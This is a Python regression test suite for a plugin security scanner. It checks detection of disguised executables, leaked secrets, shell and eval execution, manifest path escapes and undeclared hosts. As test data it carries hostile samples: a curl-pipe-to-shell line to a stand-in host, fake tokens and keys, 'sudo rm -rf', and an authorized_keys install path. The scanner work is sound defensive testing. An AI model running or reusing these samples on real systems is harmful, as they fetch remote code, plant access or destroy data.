"""Regression tests for tools/security-screen.py.

These assert observable behaviour - findings, severities, exit codes, redaction,
exception integrity and staged/working-tree/revision divergence - never the
scanner's source text. Trigger strings (tokens, keys, download-and-run idioms)
are assembled from fragments so this test file does not itself carry a verbatim
secret or exploit string.
"""
from __future__ import annotations

import hashlib
import importlib.util
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import unittest

MODULE_PATH = Path(__file__).parents[1] / "tools" / "security-screen.py"
SPEC = importlib.util.spec_from_file_location("security_screen", MODULE_PATH)
security_screen = importlib.util.module_from_spec(SPEC)
assert SPEC and SPEC.loader
sys.modules["security_screen"] = security_screen
SPEC.loader.exec_module(security_screen)

screen = security_screen.screen
exit_code = security_screen.exit_code

GIT_ENV = {
    **os.environ,
    "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t",
    "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@t",
    "GIT_CONFIG_NOSYSTEM": "1", "GIT_TERMINAL_PROMPT": "0",
}

# --- assembled trigger material (kept non-verbatim on purpose) ----------------
GH_TOKEN = "gh" + "p_" + ("A0b1c2d3" * 5)[:36]
PRIVATE_KEY = (
    "-----BEGIN " + "OPENSSH " + "PRIVATE KEY-----\n"
    + "b3BlbnNzaC1rZXktdjEAAAAA\n"
    + "-----END " + "OPENSSH " + "PRIVATE KEY-----\n"
)
CURL_RUN = "cur" + "l https://drop.example/i | " + "sh"
ELF_BYTES = b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 32
PNG_BYTES = b"\x89PNG\r\n\x1a\n" + b"\x00" * 48


def rules(envelope, rule):
    return [f for f in envelope["findings"] if f["rule"] == rule]


def has(envelope, rule):
    return bool(rules(envelope, rule))


def sev(envelope, rule):
    found = rules(envelope, rule)
    return found[0]["severity"] if found else None


def write(root: Path, rel: str, content) -> Path:
    path = root / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    if isinstance(content, bytes):
        path.write_bytes(content)
    else:
        path.write_text(content, encoding="utf-8")
    return path


def plugin_manifest(**over) -> dict:
    manifest = {
        "schema": 1, "id": "demo", "category": "plugins", "version": "1.0.0",
        "destination": "ryoku/plugins/demo",
        "entryPoints": {"main": "service/Main.qml", "content": "content/Widget.qml"},
        "files": [
            {"source": "service/Main.qml", "destination": "service/Main.qml",
             "mode": "0644", "size": 1, "sha256": "aa", "install": True},
        ],
    }
    manifest.update(over)
    return manifest


def git(root: Path, *args: str) -> None:
    subprocess.run(["git", "-C", str(root), *args], check=True,
                   capture_output=True, env=GIT_ENV)


class Base(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.root = Path(self._tmp.name) / "cand"
        self.root.mkdir()
        # A trusted policy root distinct from the candidate; no allowlist by
        # default. Tests that need exceptions write into it explicitly.
        self.policy = Path(self._tmp.name) / "trusted"
        (self.policy).mkdir()

    def tearDown(self) -> None:
        self._tmp.cleanup()

    def run_screen(self, **kw):
        kw.setdefault("policy_root", self.policy)
        return screen(self.root, **kw)


class TestEnvelopeAndClean(Base):
    def test_clean_plugin_is_silent(self):
        write(self.root, "plugins/demo/manifest.json",
              json.dumps(plugin_manifest()))
        write(self.root, "plugins/demo/content/Widget.qml",
              "import QtQuick\nimport Ryoku.PluginKit\nItem { }\n")
        write(self.root, "plugins/demo/service/Main.qml",
              "import QtQuick\nItem { }\n")
        env = self.run_screen()
        self.assertEqual(env["errors"], [])
        self.assertEqual([f for f in env["findings"] if f["severity"] == "blocking"], [])
        self.assertEqual(exit_code(env), 0)

    def test_envelope_shape(self):
        write(self.root, "a.bin", ELF_BYTES)
        env = self.run_screen()
        self.assertEqual(env["schema"], 1)
        self.assertIsInstance(env["findings"], list)
        self.assertIsInstance(env["errors"], list)
        for f in env["findings"]:
            self.assertEqual(
                set(f), {"rule", "path", "line", "severity", "message", "fingerprint"}
            )

    def test_missing_root_is_infra(self):
        env = screen(self.root / "nope", policy_root=self.policy)
        self.assertTrue(env["errors"])
        self.assertEqual(exit_code(env), 2)


class TestBinary(Base):
    def test_elf_disguised_as_png_is_blocking(self):
        write(self.root, "plugins/demo/assets/preview.png", ELF_BYTES)
        env = self.run_screen()
        self.assertEqual(sev(env, "binary.executable"), "blocking")
        self.assertEqual(exit_code(env), 1)

    def test_python_bytecode_disguised_as_asset_is_blocking(self):
        write(self.root, "plugins/demo/assets/cache.dat",
              importlib.util.MAGIC_NUMBER + b"\x00" * 32)
        env = self.run_screen()
        self.assertEqual(sev(env, "binary.executable"), "blocking")
        self.assertEqual(exit_code(env), 1)

    def test_real_png_is_not_flagged(self):
        write(self.root, "plugins/demo/assets/preview.png", PNG_BYTES)
        env = self.run_screen()
        self.assertFalse(has(env, "binary.executable"))
        self.assertFalse(has(env, "binary.opaque"))

    def test_mach_o_and_pe_magic(self):
        write(self.root, "macho", b"\xcf\xfa\xed\xfe" + b"\x00" * 40)
        write(self.root, "win.dat", b"MZ" + b"\x00" * 58 + (0x40).to_bytes(4, "little")
              + b"PE\x00\x00" + b"\x00" * 8)
        env = self.run_screen()
        self.assertEqual(len(rules(env, "binary.executable")), 2)


class TestSecretsRedaction(Base):
    def test_secrets_detected_and_redacted(self):
        write(self.root, "plugins/demo/service/Main.qml",
              'import QtQuick\nItem { property string t: "%s" }\n' % GH_TOKEN)
        write(self.root, "plugins/demo/id_key", PRIVATE_KEY)
        env = self.run_screen()
        self.assertEqual(sev(env, "secret.github_token"), "blocking")
        self.assertEqual(sev(env, "secret.private_key"), "blocking")
        blob = json.dumps(env)
        # the matched material must never survive into the report
        self.assertNotIn(GH_TOKEN, blob)
        self.assertNotIn("b3BlbnNzaC1rZXktdjEAAAAA", blob)
        self.assertNotIn("BEGIN OPENSSH", blob)

    def test_placeholder_is_not_a_secret(self):
        write(self.root, "plugins/demo/service/config.py",
              'token = "your_token_here_example"\n')
        env = self.run_screen()
        self.assertFalse(has(env, "secret.generic_credential"))

    def test_secret_in_readme_still_caught(self):
        write(self.root, "plugins/demo/README.md",
              "Example key:\n\n    %s\n" % GH_TOKEN)
        env = self.run_screen()
        self.assertTrue(has(env, "secret.github_token"))


class TestPluginImports(Base):
    def _widget(self, body: str):
        write(self.root, "plugins/demo/manifest.json",
              json.dumps(plugin_manifest()))
        write(self.root, "plugins/demo/content/Widget.qml", body)

    def test_shell_and_ui_internal_imports_block(self):
        self._widget("import QtQuick\nimport shell.Bar\nimport Ryoku.Ui.Private\nItem{}\n")
        env = self.run_screen()
        self.assertEqual(len(rules(env, "plugin.forbidden_import")), 2)
        self.assertEqual(sev(env, "plugin.forbidden_import"), "blocking")

    def test_relative_import_escape_blocks(self):
        write(self.root, "plugins/demo/manifest.json", json.dumps(plugin_manifest()))
        write(self.root, "plugins/demo/content/Widget.qml",
              'import QtQuick\nimport "../../../secrets/Thing.qml"\nItem{}\n')
        env = self.run_screen()
        self.assertEqual(sev(env, "plugin.import_escape"), "blocking")

    def test_allowed_and_in_folder_imports_are_clean(self):
        write(self.root, "plugins/demo/manifest.json", json.dumps(plugin_manifest()))
        write(self.root, "plugins/demo/content/Widget.qml",
              'import QtQuick\nimport Ryoku.PluginKit.Singletons\nimport "../service/Main.qml"\nItem{}\n')
        write(self.root, "plugins/demo/service/Main.qml", "import QtQuick\nItem{}\n")
        env = self.run_screen()
        self.assertFalse(has(env, "plugin.forbidden_import"))
        self.assertFalse(has(env, "plugin.import_escape"))

    def test_shell_import_outside_plugin_is_not_flagged(self):
        # A bar style legitimately imports shell internals; R4 is plugin-scoped.
        write(self.root, "barstyles/imi/Scene.qml", "import QtQuick\nimport shell.Bar\nItem{}\n")
        env = self.run_screen()
        self.assertFalse(has(env, "plugin.forbidden_import"))


class TestDynamicExecution(Base):
    def test_python_dynamic_exec(self):
        src = (
            "import os, subprocess\n"
            "def f(x):\n"
            "    eval(x)\n"
            "    os.system('id')\n"
            "    subprocess.run('id', shell=True)\n"
        )
        write(self.root, "plugins/demo/bin/x.py", src)
        env = self.run_screen()
        self.assertEqual(sev(env, "exec.eval_exec"), "blocking")
        self.assertEqual(sev(env, "exec.os_system"), "blocking")
        self.assertEqual(sev(env, "exec.subprocess_shell"), "blocking")

    def test_python_safe_argv_is_clean(self):
        src = (
            "import subprocess\n"
            "subprocess.run(['id', '-u'], shell=False)\n"
            "subprocess.run(['ls', '-la'])\n"
        )
        write(self.root, "plugins/demo/bin/safe.py", src)
        env = self.run_screen()
        self.assertFalse(has(env, "exec.subprocess_shell"))
        self.assertFalse(has(env, "exec.os_system"))
        self.assertFalse(has(env, "exec.eval_exec"))

    def test_malformed_python_fails_visibly(self):
        write(self.root, "plugins/demo/bin/broken.py", "def (:\n  pass\n")
        env = self.run_screen()
        self.assertTrue(has(env, "parse.python_error"))

    def test_js_eval_blocks(self):
        write(self.root, "plugins/demo/content/Widget.qml",
              "import QtQuick\nItem { function f(){ return eval('1') } }\n")
        env = self.run_screen()
        self.assertEqual(sev(env, "exec.js_eval"), "blocking")


class TestShell(Base):
    def _sh(self, body: str, name="plugins/demo/bin/s.sh"):
        write(self.root, name, "#!/usr/bin/env bash\n" + body)

    def test_download_and_run_blocks(self):
        self._sh(CURL_RUN + "\n")
        env = self.run_screen()
        self.assertEqual(sev(env, "exec.download_run"), "blocking")

    def test_download_run_documented_in_markdown_is_ignored(self):
        write(self.root, "plugins/demo/README.md", "Never use `%s`.\n" % CURL_RUN)
        env = self.run_screen()
        self.assertFalse(has(env, "exec.download_run"))

    def test_sudo_blocks(self):
        self._sh("sudo rm -rf /tmp/x\n")
        env = self.run_screen()
        self.assertEqual(sev(env, "shell.privilege_escalation"), "blocking")

    def test_interpolated_c_warns_but_static_is_clean(self):
        self._sh('sh -c "echo $UNTRUSTED"\n')
        env = self.run_screen()
        self.assertEqual(sev(env, "shell.interpolated_c"), "warning")
        # a static single-quoted -c string is an argv-safe pattern, not flagged
        write(self.root, "plugins/demo/bin/ok.sh",
              "#!/usr/bin/env bash\nsh -c 'echo static'\n")
        env2 = self.run_screen()
        interp = [f for f in rules(env2, "shell.interpolated_c")
                  if f["path"].endswith("ok.sh")]
        self.assertEqual(interp, [])

    def test_jq_program_does_not_leak_commands(self):
        # multi-line single-quoted jq program: its pipes/builtins are not commands
        self._sh("data=$(cat f)\n"
                 "echo \"$data\" | jq '\n"
                 "  .items\n"
                 "  | map(.name)\n"
                 "  | length\n"
                 "'\n")
        env = self.run_screen()
        names = {f["message"].split("'")[1] for f in rules(env, "command.undeclared")}
        self.assertNotIn("map", names)
        self.assertNotIn("length", names)


class TestManifest(Base):
    def test_source_and_destination_escapes_block(self):
        manifest = plugin_manifest(files=[
            {"source": "../escape.qml", "destination": "x.qml",
             "mode": "0644", "size": 1, "sha256": "aa", "install": True},
            {"source": "a.qml", "destination": "../../.config/autostart/x.desktop",
             "mode": "0644", "size": 1, "sha256": "bb", "install": True},
        ])
        write(self.root, "plugins/demo/manifest.json", json.dumps(manifest, indent=2))
        env = self.run_screen()
        self.assertEqual(sev(env, "manifest.source_escape"), "blocking")
        self.assertEqual(sev(env, "manifest.destination_escape"), "blocking")

    def test_privileged_destination_blocks(self):
        manifest = plugin_manifest(files=[
            {"source": "a", "destination": ".ssh/authorized_keys",
             "mode": "0644", "size": 1, "sha256": "aa", "install": True},
        ])
        write(self.root, "plugins/demo/manifest.json", json.dumps(manifest, indent=2))
        env = self.run_screen()
        self.assertEqual(sev(env, "manifest.privileged_destination"), "blocking")

    def test_exec_mode_in_bin_is_not_flagged(self):
        manifest = plugin_manifest(files=[
            {"source": "bin/tool", "destination": "bin/tool",
             "mode": "0755", "size": 1, "sha256": "aa", "install": True},
            {"source": "run.sh", "destination": "run.sh",
             "mode": "0755", "size": 1, "sha256": "bb", "install": True},
        ])
        write(self.root, "plugins/demo/manifest.json", json.dumps(manifest, indent=2))
        env = self.run_screen()
        flagged = {f["message"] for f in rules(env, "manifest.install_executable")}
        self.assertTrue(any("run.sh" in m for m in flagged))
        self.assertFalse(any("bin/tool" in m for m in flagged))


class TestDeclarations(Base):
    def test_network_host_declared_vs_undeclared(self):
        manifest = plugin_manifest(capabilities={"network": ["api.example.com"]})
        write(self.root, "plugins/demo/manifest.json", json.dumps(manifest))
        write(self.root, "plugins/demo/bin/net.py",
              "import urllib.request\n"
              "urllib.request.urlopen('https://api.example.com/v1')\n"
              "urllib.request.urlopen('https://evil.example.net/x')\n")
        env = self.run_screen()
        hosts = {f["message"].split("contacts ")[1].split(",")[0]
                 for f in rules(env, "network.undeclared_host")}
        self.assertIn("evil.example.net", hosts)
        self.assertNotIn("api.example.com", hosts)

    def test_command_declared_vs_undeclared(self):
        manifest = plugin_manifest(dependencies={"commands": ["mytool"]})
        write(self.root, "plugins/demo/manifest.json", json.dumps(manifest))
        write(self.root, "plugins/demo/bin/run.py",
              "import subprocess\n"
              "subprocess.run(['mytool', 'go'])\n"
              "subprocess.run(['othertool', 'go'])\n")
        env = self.run_screen()
        cmds = {f["message"].split("'")[1] for f in rules(env, "command.undeclared")}
        self.assertIn("othertool", cmds)
        self.assertNotIn("mytool", cmds)


class TestFilesystem(Base):
    def test_newline_in_filename_blocks_and_is_escaped(self):
        write(self.root, "plugins/demo/a\nb.txt", "hi\n")
        env = self.run_screen()
        self.assertEqual(sev(env, "fs.control_char_name"), "blocking")
        # the reported path must not carry a raw newline (log/spoof safety)
        path = rules(env, "fs.control_char_name")[0]["path"]
        self.assertNotIn("\n", path)
        self.assertIn("\\n", path)

    def test_symlink_is_rejected_not_followed(self):
        target = self.root / "plugins" / "demo" / "real.txt"
        target.parent.mkdir(parents=True)
        target.write_text("data\n")
        os.symlink("real.txt", self.root / "plugins" / "demo" / "link.txt")
        env = self.run_screen()
        self.assertEqual(sev(env, "payload.symlink"), "blocking")


class TestGitModes(Base):
    def _commit_clean_stage_malicious(self):
        git(self.root, "init", "-q")
        rel = "plugins/demo/service/Main.qml"
        clean = "import QtQuick\nItem { }\n"
        malicious = 'import QtQuick\nItem { property string t: "%s" }\n' % GH_TOKEN
        write(self.root, rel, clean)
        git(self.root, "add", "-A")
        git(self.root, "commit", "-qm", "clean")
        # stage the malicious content, then restore a clean working tree
        write(self.root, rel, malicious)
        git(self.root, "add", rel)
        write(self.root, rel, clean)
        return rel

    def test_staged_sees_index_not_worktree(self):
        self._commit_clean_stage_malicious()
        staged = self.run_screen(staged=True)
        self.assertTrue(has(staged, "secret.github_token"))

    def test_worktree_and_revision_see_clean(self):
        self._commit_clean_stage_malicious()
        worktree = self.run_screen()
        head = self.run_screen(revision="HEAD")
        self.assertFalse(has(worktree, "secret.github_token"))
        self.assertFalse(has(head, "secret.github_token"))

    def test_revision_reads_exact_tree(self):
        git(self.root, "init", "-q")
        write(self.root, "x.bin", "safe\n")
        git(self.root, "add", "-A")
        git(self.root, "commit", "-qm", "one")
        write(self.root, "x.bin", ELF_BYTES)
        git(self.root, "add", "-A")
        git(self.root, "commit", "-qm", "two")
        head = self.run_screen(revision="HEAD")
        prev = self.run_screen(revision="HEAD~1")
        self.assertTrue(has(head, "binary.executable"))
        self.assertFalse(has(prev, "binary.executable"))

    def test_git_symlink_blob_is_rejected(self):
        git(self.root, "init", "-q")
        (self.root / "t.txt").write_text("data\n")
        os.symlink("t.txt", self.root / "l.txt")
        git(self.root, "add", "-A")
        git(self.root, "commit", "-qm", "s")
        env = self.run_screen(revision="HEAD")
        self.assertEqual(sev(env, "payload.symlink"), "blocking")

    def test_staged_requires_git(self):
        write(self.root, "a.txt", "hi\n")
        env = self.run_screen(staged=True)
        self.assertTrue(env["errors"])
        self.assertEqual(exit_code(env), 2)


def sha256_file(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


class TestExceptions(Base):
    def _elf_and_digest(self):
        p = write(self.root, "vendor/tool.bin", ELF_BYTES)
        return "vendor/tool.bin", sha256_file(p)

    def _policy(self, entries):
        write(self.policy, "security/exceptions.json",
              json.dumps({"schema": 1, "exceptions": entries}))

    def test_valid_exception_suppresses(self):
        path, digest = self._elf_and_digest()
        self._policy([{
            "rule": "binary.executable", "path": path, "sha256": digest,
            "reason": "reviewed vendored release binary", "expires": "2999-01-01",
        }])
        env = self.run_screen(today=security_screen.datetime.date(2026, 9, 7))
        self.assertFalse(has(env, "binary.executable"))
        self.assertFalse(has(env, "exception.unused"))
        self.assertEqual(exit_code(env), 0)

    def test_expired_exception_blocks_and_does_not_suppress(self):
        path, digest = self._elf_and_digest()
        self._policy([{
            "rule": "binary.executable", "path": path, "sha256": digest,
            "reason": "old", "expires": "2000-01-01",
        }])
        env = self.run_screen(today=security_screen.datetime.date(2026, 9, 7))
        self.assertEqual(sev(env, "exception.expired"), "blocking")
        self.assertTrue(has(env, "binary.executable"))

    def test_unused_exception_blocks(self):
        self._elf_and_digest()
        self._policy([{
            "rule": "binary.executable", "path": "vendor/tool.bin",
            "sha256": "0" * 64, "reason": "stale digest", "expires": "2999-01-01",
        }])
        env = self.run_screen(today=security_screen.datetime.date(2026, 9, 7))
        self.assertEqual(sev(env, "exception.unused"), "blocking")
        self.assertTrue(has(env, "binary.executable"))

    def test_glob_and_malformed_exceptions_are_invalid(self):
        self._elf_and_digest()
        self._policy([
            {"rule": "binary.executable", "path": "vendor/*", "sha256": "0" * 64,
             "reason": "glob", "expires": "2999-01-01"},
            {"rule": "no.such.rule", "path": "vendor/tool.bin", "sha256": "0" * 64,
             "reason": "bad rule", "expires": "2999-01-01"},
        ])
        env = self.run_screen(today=security_screen.datetime.date(2026, 9, 7))
        self.assertEqual(len(rules(env, "exception.invalid")), 2)
        self.assertEqual(sev(env, "exception.invalid"), "blocking")

    def test_malformed_exception_file_is_infra(self):
        self._elf_and_digest()
        write(self.policy, "security/exceptions.json", "{ not json ]")
        env = self.run_screen()
        self.assertTrue(env["errors"])
        self.assertEqual(exit_code(env), 2)

    def test_candidate_supplied_allowlist_is_ignored(self):
        path, digest = self._elf_and_digest()
        # A hostile PR ships its own allowlist inside the candidate tree; policy
        # root points at the trusted base, so it must have no effect.
        write(self.root, "security/exceptions.json",
              json.dumps({"schema": 1, "exceptions": [{
                  "rule": "binary.executable", "path": path, "sha256": digest,
                  "reason": "trust me", "expires": "2999-01-01"}]}))
        env = self.run_screen()
        self.assertTrue(has(env, "binary.executable"))
        self.assertEqual(exit_code(env), 1)


class TestBounds(Base):
    def test_oversize_file_reported_not_silently_skipped(self):
        orig = security_screen.MAX_SCAN_BYTES
        try:
            security_screen.MAX_SCAN_BYTES = 16
            write(self.root, "plugins/demo/big.py",
                  "x = 1  # " + "padding " * 20 + "\n")
            env = self.run_screen()
            self.assertTrue(has(env, "file.too_large"))
        finally:
            security_screen.MAX_SCAN_BYTES = orig


class TestLineCap(Base):
    def test_overlong_code_line_fails_closed(self):
        pad = " " * (security_screen.MAX_LINE_BYTES + 10)
        write(self.root, "plugins/demo/content/x.js", pad + "eval('1')\n")
        env = self.run_screen()
        self.assertEqual(sev(env, "scan.line_too_long"), "blocking")
        self.assertEqual(exit_code(env), 1)

    def test_overlong_text_line_still_screens_secrets(self):
        # the ScreenBoundaryReview bypass: spaces past the cap then a token in a
        # non-code .txt must still be caught (full-line secret scan) and redacted
        pad = " " * (security_screen.MAX_LINE_BYTES + 10)
        write(self.root, "plugins/demo/notes.txt", pad + GH_TOKEN + "\n")
        env = self.run_screen()
        self.assertEqual(sev(env, "secret.github_token"), "blocking")
        self.assertEqual(exit_code(env), 1)
        self.assertNotIn(GH_TOKEN, json.dumps(env))
        for f in rules(env, "scan.line_too_long"):
            self.assertEqual(f["severity"], "warning")  # data, not code

    def test_overlong_data_line_is_warning_not_blocking(self):
        pad = '{"a":"' + "x" * (security_screen.MAX_LINE_BYTES + 10) + '"}'
        write(self.root, "plugins/demo/data/big.json", pad)
        env = self.run_screen()
        llt = rules(env, "scan.line_too_long")
        self.assertTrue(llt)
        self.assertTrue(all(f["severity"] == "warning" for f in llt))
        self.assertEqual([f for f in env["findings"] if f["severity"] == "blocking"], [])
        self.assertEqual(exit_code(env), 0)

    def test_moderate_long_line_is_fully_scanned(self):
        # 8192 spaces + eval is within the raised cap and caught directly
        write(self.root, "plugins/demo/manifest.json", json.dumps(plugin_manifest()))
        write(self.root, "plugins/demo/content/x.js", " " * 8192 + "eval('1')\n")
        env = self.run_screen()
        self.assertEqual(sev(env, "exec.js_eval"), "blocking")
        self.assertFalse(has(env, "scan.line_too_long"))


class TestExportWalk(Base):
    def test_hidden_and_vcs_named_dirs_are_scanned(self):
        write(self.root, "plugins/demo/node_modules/pkg/tool.bin", ELF_BYTES)
        write(self.root, "plugins/demo/CVS/hidden.bin", ELF_BYTES)
        write(self.root, "plugins/demo/.cache/x.bin", ELF_BYTES)
        env = self.run_screen()  # non-git root -> filesystem walk
        paths = {f["path"] for f in rules(env, "binary.executable")}
        self.assertIn("plugins/demo/node_modules/pkg/tool.bin", paths)
        self.assertIn("plugins/demo/CVS/hidden.bin", paths)
        self.assertIn("plugins/demo/.cache/x.bin", paths)

    def test_directory_symlink_surfaced_not_followed(self):
        outside = Path(self._tmp.name) / "outside"
        outside.mkdir()
        (outside / "secret.bin").write_bytes(ELF_BYTES)
        (self.root / "plugins" / "demo").mkdir(parents=True)
        write(self.root, "plugins/demo/ok.txt", "hi\n")
        os.symlink(outside, self.root / "plugins" / "demo" / "linkdir")
        env = self.run_screen()
        self.assertEqual(sev(env, "payload.symlink"), "blocking")
        self.assertFalse(any("secret.bin" in f["path"] for f in env["findings"]))


class TestBothManifests(Base):
    def test_runtime_manifest_owns_capabilities(self):
        folder = "plugins/demo"
        write(self.root, folder + "/manifest.json", json.dumps(plugin_manifest(
            capabilities={"network": ["api.example.com"]},
            dependencies={"commands": ["mytool"]},
        )))
        write(self.root, folder + "/product-manifest.json", json.dumps({
            "schema": 1, "id": "demo", "category": "plugins", "version": "1.0.0",
            "destination": "ryoku/plugins/demo",
            "files": [{"source": "bin/run.py", "destination": "bin/run.py",
                       "mode": "0755", "size": 1, "sha256": "aa", "install": True}],
        }))
        write(self.root, folder + "/bin/run.py",
              "import subprocess, urllib.request\n"
              "urllib.request.urlopen('https://api.example.com/v1')\n"
              "urllib.request.urlopen('https://evil.example.net/x')\n"
              "subprocess.run(['mytool', 'go'])\n"
              "subprocess.run(['othertool', 'go'])\n")
        env = self.run_screen()
        hosts = {f["message"].split("contacts ")[1].split(",")[0]
                 for f in rules(env, "network.undeclared_host")}
        cmds = {f["message"].split("'")[1] for f in rules(env, "command.undeclared")}
        self.assertNotIn("api.example.com", hosts)  # runtime declaration honored
        self.assertIn("evil.example.net", hosts)
        self.assertNotIn("mytool", cmds)
        self.assertIn("othertool", cmds)


class TestOutputRedaction(Base):
    def test_url_userinfo_token_never_leaks(self):
        write(self.root, "plugins/demo/manifest.json", json.dumps(plugin_manifest()))
        write(self.root, "plugins/demo/bin/x.py",
              "import urllib.request\n"
              "urllib.request.urlopen('https://%s@github.com/o/r')\n" % GH_TOKEN)
        env = self.run_screen()
        blob = json.dumps(env)
        self.assertNotIn(GH_TOKEN, blob)
        self.assertTrue(has(env, "secret.github_token"))
        hosts = {f["message"].split("contacts ")[1].split(",")[0]
                 for f in rules(env, "network.undeclared_host")}
        self.assertIn("github.com", hosts)
        self.assertFalse(any("ghp" in h for h in hosts))

    def test_manifest_value_secret_is_redacted(self):
        manifest = plugin_manifest(files=[
            {"source": "../" + GH_TOKEN, "destination": "x.qml",
             "mode": "0644", "size": 1, "sha256": "aa", "install": True},
        ])
        write(self.root, "plugins/demo/manifest.json", json.dumps(manifest, indent=2))
        env = self.run_screen()
        self.assertTrue(has(env, "manifest.source_escape"))
        self.assertNotIn(GH_TOKEN, json.dumps(env))

    def test_control_chars_escaped_in_output(self):
        write(self.root, "plugins/demo/a\nb.txt", "hi\n")
        env = self.run_screen()
        blob = json.dumps(env)
        # the report is JSON-encoded; a raw newline byte must never appear inside
        # a finding path/message value (only as JSON structure)
        for f in env["findings"]:
            self.assertNotIn("\n", f["path"])
            self.assertNotIn("\n", f["message"])


class TestJsFunctionAndSubprocess(Base):
    def _plugin_widget(self, body):
        write(self.root, "plugins/demo/manifest.json", json.dumps(plugin_manifest()))
        write(self.root, "plugins/demo/content/Widget.qml", body)

    def test_function_constructor_without_new(self):
        self._plugin_widget(
            "import QtQuick\nItem { function f(){ return Function('return 1')() } }\n")
        env = self.run_screen()
        self.assertEqual(sev(env, "exec.js_eval"), "blocking")

    def test_new_function_still_caught(self):
        self._plugin_widget(
            "import QtQuick\nItem { property var g: new Function('x', 'return x') }\n")
        env = self.run_screen()
        self.assertEqual(sev(env, "exec.js_eval"), "blocking")

    def test_unqualified_subprocess_shell_true(self):
        write(self.root, "plugins/demo/bin/x.py",
              "from subprocess import check_output, check_call\n"
              "check_output('id', shell=True)\n"
              "check_call('id', shell=True)\n")
        env = self.run_screen()
        self.assertEqual(sev(env, "exec.subprocess_shell"), "blocking")
        self.assertEqual(len(rules(env, "exec.subprocess_shell")), 2)

    def test_qualified_subprocess_shell_true(self):
        write(self.root, "plugins/demo/bin/y.py",
              "import subprocess\nsubprocess.check_output('id', shell=True)\n")
        env = self.run_screen()
        self.assertEqual(sev(env, "exec.subprocess_shell"), "blocking")


if __name__ == "__main__":
    unittest.main()
